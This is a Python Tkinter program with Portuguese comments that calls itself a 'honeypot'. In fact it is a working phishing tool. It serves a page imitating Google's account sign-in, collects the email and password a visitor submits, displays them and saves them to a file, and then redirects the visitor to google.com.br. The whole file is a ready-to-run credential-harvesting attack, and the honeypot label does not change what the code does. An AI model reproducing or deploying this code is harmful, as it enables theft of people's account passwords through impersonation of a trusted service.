import tkinter as tk
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading
from tkinter import scrolledtext, filedialog, messagebox
import os
import sys
from datetime import datetime
from urllib.parse import parse_qs

# Conteúdo HTML para a página de login
html_content = """
<!DOCTYPE html>
<html>
<head>
    <link rel="icon" type="image/x-icon" href="https://img1.gratispng.com/20180412/oje/kisspng-google-logo-google-search-advertising-google-5acf6362e55785.2911993015235408349394.jpg">  
<center>
    <title>One account. All of Google.</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #fff;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 400px;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        img#google-logo {
            height: 40px; /* Altura reduzida */
            margin-bottom: 20px;
        }
        img#avatar {
            width: 100px; /* Largura ajustada */
            height: 100px; /* Altura ajustada */
            border-radius: 50%; /* Arredonda a imagem */
            margin-bottom: 10px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            height: 40px;
            margin-bottom: 10px;
            padding: 0 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            height: 40px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .footer {
            font-size: 12px;
            margin-top: 20px;
        }
        img#logo-accounts {
            height: 20px; /* Altura ajustada para diminuir */
        }
        h5 {
            font-size: 15px;
            color: #757575; /* Cor cinza */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img id="google-logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
        <h1 style="font-size: 24px;">Sign in with your Google Account</h1>
        <h5>Sign in to Gmail account</h5>
        <img id="avatar" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Login Image">
        <form method="post" action="/">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
        <img id="google-logo" src="https://www.ufpb.br/ccau/contents/imagens/home/branco.png/@@images/image.png" alt="Google">
        <h1 style="font-size: 24px;"></h1>
        <div class="footer">        
            <h5>One Google Account for everything Google</h5>
            <img id="logo-accounts" src="https://ssl.gstatic.com/accounts/ui/logo_strip_2x.png" alt="Logotipo do Google">
        </div>
    </div>
    </center>
</body>
</html>
"""

# Função para iniciar o honeypot com conteúdo HTML embutido
def start_honeypot():
    global welcome_message
    welcome_message = html_content  # Use o conteúdo HTML embutido

    # Obter a porta do campo de entrada
    try:
        port = int(port_entry.get())
        if not (1 <= port <= 65535):
            raise ValueError("Porta fora do intervalo permitido (1-65535).")
    except ValueError as ve:
        messagebox.showwarning("Aviso", f"Porta inválida: {ve}")
        return

    # Iniciar o servidor em uma thread separada
    threading.Thread(target=start_server, args=(port,), daemon=True).start()

    # Exibir a URL no resultado
    result_text.insert(tk.END, f"Honeypot em execução na porta: {port}\n")
    result_text.insert(tk.END, f"\nConecte-se usando a URL: http://127.0.0.1:{port}\n")

# Configurar a localidade para português do Brasil
from locale import setlocale, LC_TIME
setlocale(LC_TIME, 'pt_BR.utf8')

# Variável global para controlar a mensagem de intrusão
intrusion_detected = False
server = None  # Variável global para armazenar a instância do servidor

# Salva as saídas padrão
original_stdout = sys.stdout
original_stderr = sys.stderr

# Redireciona a saída padrão e de erro para /dev/null (Linux) ou nul (Windows)
if sys.platform.startswith('Windows'):
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
elif sys.platform.startswith('win'):
    sys.stdout = open('nul', 'w')
    sys.stderr = open('nul', 'w')

# Classe para manipular as solicitações HTTP
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global intrusion_detected
        # Registra o IP e a URL acessada        
        ip = self.client_address[0]
        port = self.server.server_port
        url = self.path

        # Mapear o número do dia da semana para o nome em português
        weekday_names = [
            "Segunda-feira",
            "Terça-feira",
            "Quarta-feira",
            "Quinta-feira",
            "Sexta-feira",
            "Sábado",
            "Domingo"
        ]
        weekday_number = datetime.now().weekday()
        weekday_name = weekday_names[weekday_number]
        
        status_message = f"\n\nTENTATIVA DE INTRUSAO DETECTADA    {ip}:{port}  ({weekday_name} -  {datetime.now().strftime('%c')})\n"
        result_text.insert(tk.END, status_message)

        # Adiciona cabeçalho da página à janela
        result_text.insert(tk.END, "\nCabeçalho da Página\n=================\n")
        for header, value in self.headers.items():
            result_text.insert(tk.END, f"{header}: {value}\n")

        if intrusion_detected:
            # Exibe a mensagem de intrusão
            self.send_response(403)
            self.end_headers()
            result_text.insert(tk.END, "Resposta HTTP 403: Acesso Proibido\n")
            intrusion_detected = False  # Reinicia a variável após exibir a mensagem
        else:
            # Envia a mensagem de boas-vindas em HTML
            self.send_response(200)            
            self.end_headers()
            self.wfile.write(bytes(welcome_message, "utf8"))

    def do_POST(self):
        # Lidar com solicitações POST e extrair dados do corpo
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_params = parse_qs(post_data.decode('utf-8'))

        # Exibir os dados recebidos no resultado
        result_text.insert(tk.END, "\n\n\nDados Recebidos\n==============\n")
        
        # Chaves indesejadas a serem filtradas
        unwanted_keys = ["source"]

        for key, value in post_params.items():
            if key not in unwanted_keys:
                result_text.insert(tk.END, f"{key}: {value[0]}\n")

        # Enviar resposta HTTP 302 Found e redirecionar para o Google
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com.br/')
        self.end_headers()


# Classe para criar um servidor HTTP
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass

# Função para iniciar o servidor
def start_server(port):
    global server
    server = ThreadedHTTPServer(('0.0.0.0', port), RequestHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()

# Função para parar o servidor
def stop_honeypot():
    global server
    if server:
        server.shutdown()
        result_text.insert(tk.END, "\nHoneypot Parado\n")
        server = None
    else:
        messagebox.showinfo("Info", "O honeypot não está em execução.")

# Função para salvar o resultado em um arquivo
def save_result():
    log_file = filedialog.asksaveasfilename(defaultextension=".txt",
                                            filetypes=[("Arquivos de Texto", "*.txt"),
                                                       ("Todos os Arquivos", "*.*")])
    if log_file:
        with open(log_file, 'w') as f:
            f.write(result_text.get(1.0, tk.END))
        messagebox.showinfo("Sucesso", "Resultado salvo com sucesso.")

# Função para limpar o resultado
def clear_result():
    result_text.delete(1.0, tk.END)

# Interface Gráfica usando Tkinter
root = tk.Tk()
root.wm_state('zoomed')
root.title("Honeypot black")
root.configure(bg="black")

# Rótulo Honeypot
label_honeypot = tk.Label(root, text="👩‍💻 🍯 Honeypot 🍯 👩‍💻", font=("Arial", 18), pady=0, fg="yellow", bg="black", bd=5)
label_honeypot.grid(row=0, column=0, columnspan=3, pady=(20, 10), sticky="n")

# Campo de entrada para a porta
port_label = tk.Label(root, text="Digite o número da Porta", font=("Arial", 12), bg="black", fg="white")
port_label.grid(row=1, column=0, padx=5, pady=3, sticky=tk.E)

port_entry = tk.Entry(root, font=("Arial", 12), width=15)
port_entry.grid(row=1, column=1, padx=5, pady=5, columnspan=2, sticky="w")

# Botões
button_frame = tk.Frame(root, bg="black")
button_frame.grid(row=2, column=0, columnspan=3, pady=5, sticky="n")

start_button = tk.Button(button_frame, text="Iniciar Honeypot", font=("Arial", 12), command=start_honeypot, bg="#077023", fg="white")
start_button.grid(row=0, column=0, padx=5, pady=3)

save_button = tk.Button(button_frame, text="Salvar Resultado", font=("Arial", 12), command=save_result, bg="#020af2", fg="white")
save_button.grid(row=2, column=0, padx=5, pady=3)

stop_button = tk.Button(button_frame, text="Parar Honeypot", font=("Arial", 12), command=stop_honeypot, bg="#f20236", fg="white")
stop_button.grid(row=1, column=0, padx=5, pady=5)

# Área de texto para exibir os resultados
result_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Arial", 12), width=80, height=40, bg="black", fg="#02f242")
result_text.grid(row=3, column=0, columnspan=3, padx=50, pady=50, sticky="nsew")

# Configurar expansão de linhas e colunas
root.grid_rowconfigure(3, weight=1)
root.grid_columnconfigure(0, weight=1)
root.grid_columnconfigure(1, weight=1)
root.grid_columnconfigure(2, weight=1)

root.mainloop()
